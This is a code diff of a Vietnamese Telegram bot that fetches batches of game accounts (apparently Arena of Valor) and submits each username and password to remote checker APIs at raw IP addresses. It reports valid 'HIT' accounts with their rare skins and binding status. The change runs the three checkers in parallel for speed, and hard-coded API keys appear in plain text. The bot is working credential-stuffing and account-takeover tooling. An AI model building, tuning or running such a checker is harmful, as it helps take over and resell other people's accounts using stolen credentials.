@@ -19,11 +19,13 @@ ADMIN_ID = 8721023843
 TANGACC_TOKEN = "https://tangacc.net/token.php"
 TANGACC_ACC   = "https://tangacc.net/get_lq_acc.php"
 FETCH_TIMEOUT = 30; FETCH_WORKERS = 20; FETCH_SEMAPHORE = asyncio.Semaphore(50)
-# API Check (3 fallback)
-CHECK_API_1 = "http://160.22.107.245:5000/check"       # Free, không key
-CHECK_API_2 = "http://103.77.246.176:5000/check"       # Free, không key
-CHECK_API_3 = "http://160.22.107.245:5000/check"       # Có key
+
+# API Check (3 cái, chạy song song race)
+CHECK_API_1 = "http://103.77.246.176:5000/check"
+CHECK_API_2 = "http://160.22.107.245:5000/check"
+CHECK_API_3 = "http://160.22.107.245:5000/check"
 CHECK_API_KEY = "RSAEJ8rdtRaMLfVUCB70Mh8pL0SFSDDx"
+
 JSONBIN_API_KEY = "$2a$10$ZKItx9kCcaQktuLuBDKY1ewYhT2gy3OWH.w7nkeTLWUy9sCxtjVWO"
 JSONBIN_BIN_ID = "6a6b41e8da38895dfea40e00"
 JSONBIN_API_URL = "https://api.jsonbin.io/v3/b"
@@ -31,8 +33,8 @@ LIMIT_NORMAL = 100; LIMIT_VIP = 550; CHECK_LIMIT_NORMAL = 25; CHECK_LIMIT_VIP = 
 MAX_PER_REQ = 50; KEY_EXPIRE_SECONDS = 86400
 TZ = pytz.timezone("Asia/Ho_Chi_Minh")
 SPAM_WINDOW = 10; MAX_SPAM = 5; MUTE_TIME = 60
-CHECK_TIMEOUT = 8                 # Timeout ngắn cho từng API
-CHECK_CONCURRENT = 10
+CHECK_TIMEOUT = 60                # API rất chậm, cần 60s
+CHECK_CONCURRENT = 5              # Giới hạn 5 request đồng thời
 OUTPUT_DIR = "lq_data"; MAX_HISTORY = 2000; MAX_LAST_ACC = 500; MAX_CHECKED_ACC = 500
 os.makedirs(OUTPUT_DIR, exist_ok=True)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
@@ -128,31 +130,19 @@ async def fetch_fast_async(n):
         for t in tasks: t.cancel()
     return live_accs[:n]
 
-# ======================== CHECK ACC (FALLBACK 3 API) ========================
-async def _try_check_api(url, username, password, apikey=None):
-    """
-    Gọi 1 API check.
-    Trả về dict kết quả nếu API phản hồi hợp lệ (HIT hoặc MISS).
-    Trả về None CHỈ KHI lỗi kết nối, timeout, HTTP không phải 200, hoặc response không parse được.
-    """
+# ======================== CHECK ACC (SONG SONG 3 API) ========================
+async def _call_api(url, username, password, apikey=None):
+    """Gọi 1 API, trả về dict kết quả hoặc None nếu lỗi"""
     data = {"user": username, "pass": password}
     if apikey: data["apikey"] = apikey
     try:
         async with aiohttp.ClientSession() as session:
             async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=CHECK_TIMEOUT)) as resp:
-                if resp.status != 200:
-                    # Lỗi server thực sự
-                    return None
-                try:
-                    d = await resp.json()
-                except:
-                    # Không parse được JSON
-                    return None
-                # Phải có cả 'ok' và 'result' mới coi là response hợp lệ
-                if "ok" not in d or "result" not in d:
-                    return None
-                if d["ok"] and d["result"].get("status") == "HIT":
-                    info = d["result"]; skins = info.get("aov_skins",{})
+                if resp.status != 200: return None
+                d = await resp.json()
+                if not d.get("ok") or "result" not in d: return None
+                if d["result"].get("status") == "HIT":
+                    info = d["result"]; skins = info.get("aov_skins", {})
                     ss=skins.get("ss",0); sss=skins.get("sss",0); anime=skins.get("anime",0)
                     rare=[]
                     if ss: rare.append(f"SS:{','.join(skins.get('ss_list',[]))}")
@@ -174,19 +164,23 @@ async def _try_check_api(url, username, password, apikey=None):
                             "mobile_bound":"Yes" if info.get("mobile_bound") else "No",
                             "email_verified":"Yes" if info.get("email_verified") else "No","rare":rare_str}
                 else:
-                    # ok=False hoặc status != HIT -> coi là MISS
                     return {"status":"MISS","username":username,"message":d["result"].get("detail","Sai mật khẩu / không tồn tại")}
-    except:
-        return None
+    except: return None
 
-async def check_acc_fallback(username, password):
-    """Thử lần lượt 3 API, chỉ chuyển API khi thực sự lỗi"""
-    res = await _try_check_api(CHECK_API_1, username, password)
-    if res is not None: return res
-    res = await _try_check_api(CHECK_API_2, username, password)
-    if res is not None: return res
-    res = await _try_check_api(CHECK_API_3, username, password, apikey=CHECK_API_KEY)
-    if res is not None: return res
+async def check_acc_race(username, password):
+    """Chạy 3 API song song, lấy kết quả nhanh nhất"""
+    tasks = [
+        _call_api(CHECK_API_1, username, password),
+        _call_api(CHECK_API_2, username, password),
+        _call_api(CHECK_API_3, username, password, apikey=CHECK_API_KEY),
+    ]
+    done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+    # Hủy các task còn lại
+    for task in pending: task.cancel()
+    for task in done:
+        result = task.result()
+        if result is not None:
+            return result
     return {"status":"ERROR","username":username,"message":"Tất cả API check đều lỗi"}
 
 # ======================== SPAM ========================
@@ -377,7 +371,7 @@ async def button_handler(update, context):
                 async def limited_check(acc_str):
                     if "|" not in acc_str: return {"status":"ERROR"}
                     uname, pwd = acc_str.split("|",1)
-                    async with sem: return await check_acc_fallback(uname, pwd)
+                    async with sem: return await check_acc_race(uname, pwd)
                 results = await asyncio.gather(*[limited_check(a) for a in accs_to_check])
                 success_results = [r for r in results if r["status"] in ("HIT","MISS")]
                 hit_details = []
@@ -591,8 +585,7 @@ async def users_list(update, context):
             expire_str = ""
             if u.get("expire_ts"):
                 rs = u["expire_ts"] - time.time()
-                if rs > 0: expire_str = f" (còn {int(rs//3600)}h{int((rs%3600)//60)}m)"
-                else: expire_str = " (hết hạn)"
+                expire_str = f" (còn {int(rs//3600)}h{int((rs%3600)//60)}m)" if rs > 0 else " (hết hạn)"
             u_list.append(f"👤 {u.get('name',uid)} | {uid} | {u.get('key','?')[:8]}...{expire_str}")
     await update.message.reply_text("👥 Users:\n" + "\n".join(u_list[:30]))
 async def stats(update, context):
